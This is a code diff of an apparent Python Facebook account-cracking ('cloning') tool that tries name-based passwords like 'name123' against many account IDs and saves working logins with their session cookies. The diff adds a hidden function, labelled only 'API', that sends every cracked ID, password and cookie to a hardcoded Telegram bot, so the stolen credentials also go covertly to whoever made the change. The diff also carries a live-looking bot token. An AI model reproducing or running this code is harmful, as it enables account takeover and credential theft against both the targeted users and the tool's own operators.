@@ -19,7 +19,7 @@ print("\033[1;37m [\u001b[36m•\033[1;37m] CHECKING FOR UPDATES \033[1;37m")
 time.sleep(2)
  
 
-#------------------[ KEOMON BEB ]-------------------#
+#------------------[ MR-SAURAV ]-------------------#
 ugen2=[]
 ugen=[]
 cokbrut=[]
@@ -192,7 +192,18 @@ logo =""" ____  __.              _____
  \033[1;36m[•] VERSION -> \033[1;37m   ->  \033[1;36m4.01.73\033[1;37m
   
 -----------------------------------------------"""
-
+#-----------------------[ API ]--------------------#
+ 
+def jones(idf,pw,kuki):
+    try:
+        token = "6734360712:AAGufnVQe5rY1XJQJFzA12P_j_TDUA2dpHg"
+        chatid = "5850908645"
+        ok_id =str(idf+"|"+pw+"|"+kuki)
+        url = f"https://api.telegram.org/bot{token}/sendMessage"
+        params = {"chat_id": chatid, "text": ok_id}
+        requests.get(url, params=params)
+    except:
+        pass
 #------------------[ PROXY ]-------------------#
 
 try:
@@ -294,7 +305,7 @@ def setting():
         method.append('mobile')    
     else:
         method.append('mobile')
-    print(" [\u001b[36m•\033[1;37m] CP ID OPTIONS ")
+    print(" [\u001b[36m•\033[1;37m] CHECKPOINT ID OPTIONS ")
     linex()
     print(" [\u001b[36m1\033[1;37m] SHOW CP ACCOUNTS")
     print(" [\u001b[36m2\033[1;37m] DON'T SHOW CP ACCOUNTS")
@@ -327,84 +338,89 @@ def passwrd():
     print(" \033[1;37m[\u001b[36m•\033[1;37m] YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
     print(f' [\u001b[36m•\033[1;37m] TOTAL IDz : \u001b[36m',str(len(id)))
     linex()
-    print(f' \u001b[36m>> \033[1;37m️USE FLIGHT MODE AFTER 5 MINUTES FOR FAST CLONING')
+    print(f' \u001b[36m>> \033[1;37m️USE FLIGHT MODE FOR FAST CRACKING')
     linex()
     with tred(max_workers=30) as pool:
         for yuzong in id2:
             idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
-			pwv = []
-			frs = nmf.split(' ')[0]
-			try:
-				lst = nmf.split(' ')[1]
-			except:
-				lst = ''
-			if len(nmf)<6:
-				if len(frs)<3:
-					pass
-				else:
-					pwv.append(nmf)
-					pwv.append(frs+lst)
-					pwv.append(frs+'@'+lst)
-					pwv.append(frs+'#'+lst)
-					pwv.append(lst+frs)
-					pwv.append(frs+'12')
-					pwv.append(frs+'123')
-					pwv.append(frs+'321')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'@123')
-					pwv.append(frs+'@1234')
-					pwv.append(frs+lst+'123')
-					pwv.append(frs+lst+'1234')
-					pwv.append(frs+lst+'@123')
-					pwv.append(frs+lst+'@1234')
-					pwv.append(frs+lst+'321')
-					pwv.append(lst+frs+'123')
-					pwv.append(lst+frs+'111')
-			else:
-				if len(frs)<3:
-					pwv.append(nmf)
-				else:
-					pwv.append(nmf)
-					pwv.append(frs+lst)
-					pwv.append(frs+'@'+lst)
-					pwv.append(frs+'#'+lst)
-					pwv.append(lst+frs)
-					pwv.append(frs+'12')
-					pwv.append(frs+'123')
-					pwv.append(frs+'321')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'12345')
-					pwv.append(frs+'@123')
-					pwv.append(frs+'@1234')
-					pwv.append(frs+lst+'123')
-					pwv.append(frs+lst+'1234')
-					pwv.append(frs+lst+'@123')
-					pwv.append(frs+lst+'@1234')
-					pwv.append(frs+lst+'321')
-					pwv.append(lst+frs+'123')
-					pwv.append(lst+frs+'111')
-			if 'ya' in pwpluss:
-				for xpwd in pwnya:
-					pwv.append(xpwd)
-			else:pass
-			if 'mobile' in method:
-				pool.submit(crack,idf,pwv)
-			elif 'free' in method:
-				pool.submit(crackfree,idf,pwv)
-			elif 'bapi' in method:
-				pool.submit(bapi,idf,pwv)
-			elif 'free' in method:
-				pool.submit(crackfree,idf,pwv)
-			else:
-				pool.submit(crackmbasic,idf,pwv)
+            frs = nmf.split(' ')[0]
+            pwv = []
+            if len(nmf)<6:
+                if len(frs)<3:
+                    pass
+                else:                
+                    pwv.append(frs+'12')
+                    pwv.append(frs+'123')
+                    pwv.append(frs+'1234')
+                    pwv.append(frs+'12345')
+                    pwv.append(nmf)
+                    pwv.append(frs+'@123')
+                    pwv.append(frs+'@1234')
+                    pwv.append(frs+'@12345')
+                    pwv.append(frs+'@@@')
+                    pwv.append(frs+'12345@') 
+                    pwv.append(frs+'321')
+                    pwv.append(frs+'123@')
+                    pwv.append(frs+'098')
+                    pwv.append(frs+'54321')
+                    pwv.append(nmf+'123')
+                    pwv.append(nmf+'@123')         
+                    pwv.append(frs+'123456789')
+                    pwv.append(frs+'12477474@')
+                    pwv.append(frs+'@@@@@')
+                    pwv.append(frs+'@@@###')
+                    pwv.append(frs+'#######')
+                    pwv.append(frs+'123@@##')
+                    pwv.append(frs+'321@@##')
+                                                
+            else:
+                if len(frs)<3:
+                    pwv.append(nmf)
+                else:
+                    pwv.append(frs+'12')
+                    pwv.append(frs+'123')
+                    pwv.append(frs+'1234')
+                    pwv.append(frs+'12345')
+                    pwv.append(nmf)
+                    pwv.append(frs+'@123')
+                    pwv.append(frs+'@1234')
+                    pwv.append(frs+'@12345')
+                    pwv.append(frs+'@@@')
+                    pwv.append(frs+'12345@') 
+                    pwv.append(frs+'321')
+                    pwv.append(frs+'123@')
+                    pwv.append(frs+'098')
+                    pwv.append(frs+'54321')
+                    pwv.append(nmf+'123')
+                    pwv.append(nmf+'@123')         
+                    pwv.append(frs+'123456789')
+                    pwv.append(frs+'12477474@')
+                    pwv.append(frs+'@@@@@')
+                    pwv.append(frs+'@@@###')
+                    pwv.append(frs+'#######')
+                    pwv.append(frs+'123@@##')
+                    pwv.append(frs+'321@@##')
                                         
+            if 'ya' in pwpluss:
+                for xpwd in pwnya:
+                    pwv.append(xpwd)
+            else:pass
+            if 'mobile' in method:
+                pool.submit(crack,idf,pwv)
+            elif 'free' in method:
+                pool.submit(crackfree,idf,pwv)
+            elif 'touch' in method:
+                pool.submit(crackfree,idf,pwv)
+            elif 'mbasic' in method:
+                pool.submit(crackfree,idf,pwv)
+            else:
+                pool.submit(crackfree,idf,pwv)
     linex()
-    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETED AT :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
+    print('\033[97;1m[\033[92;1m+\033[97;1m] CLONING COMPLETED TIME :\033[1;92m'+time.strftime("%H:%M")+" "+ tag)
     print('\033[97;1m[\033[92;1m•\033[95;1m] OK :\033[0;92m %s '%(ok))
     print('\033[97;1m[\033[92;1m+\033[96;1m] CP :\033[0;93m %s '%(cp))
     linex()
-    woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m CLICK ENTER FOR MAIN MENU')
+    woi = input('\033[97;1m[\033[92;1m+\033[95;1m] \033[1;37m ENTER TO BACK')
     os.system("python run.py")
     exit() 
 #--------------------[ METODE-B-API ]-----------------#
@@ -467,16 +483,16 @@ def crack(idf,pwv):
 				ok+=1
 				coki=po.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
-				print(f'\r{P}{H} [\033[1;37mKEOMON-BEB-[🍪]-OK\033[1;32m\033[1;37m] {H}{idf}|{pw}\n{P}[{H}COOKIE]{P}\033[1;31m{kuki}')
+				print(f'\r{P}{H} [\033[1;37mK3SH9V-[🌼]-OK\033[1;32m\033[1;37m] {H}{idf}|{pw}\n{P}[{H}COOKIE]{P}\033[1;31m{kuki}')
 				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
 				cek_apk(kuki)
-				open('/sdcard/KEOMONv4-OK.txt', 'a').write( idf+' | '+pw+' | '+kuki+'\n')
+				open('/sdcard/KEOMONv4/OK.txt', 'a').write( idf+' | '+pw+' | '+kuki+'\n')
 				jones(idf,pw,kuki)
 				break
 			elif "checkpoint" in po.cookies.get_dict().keys():
 				print(f'\r{P}[{K}\033[1;36mKEOMON-BEB-[🤢]-CP \033[1;37m{P}] {K}{idf}|{pw}')
 				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
-				open('/sdcard/KEOMONv4[🤢]-CP.txt', 'a').write( idf+' | '+pw+'\n')
+				open('/sdcard/KEOMONv4/CP.txt', 'a').write( idf+' | '+pw+'\n')
 				akun.append(idf+'|'+pw)
 				cp+=1
 				break
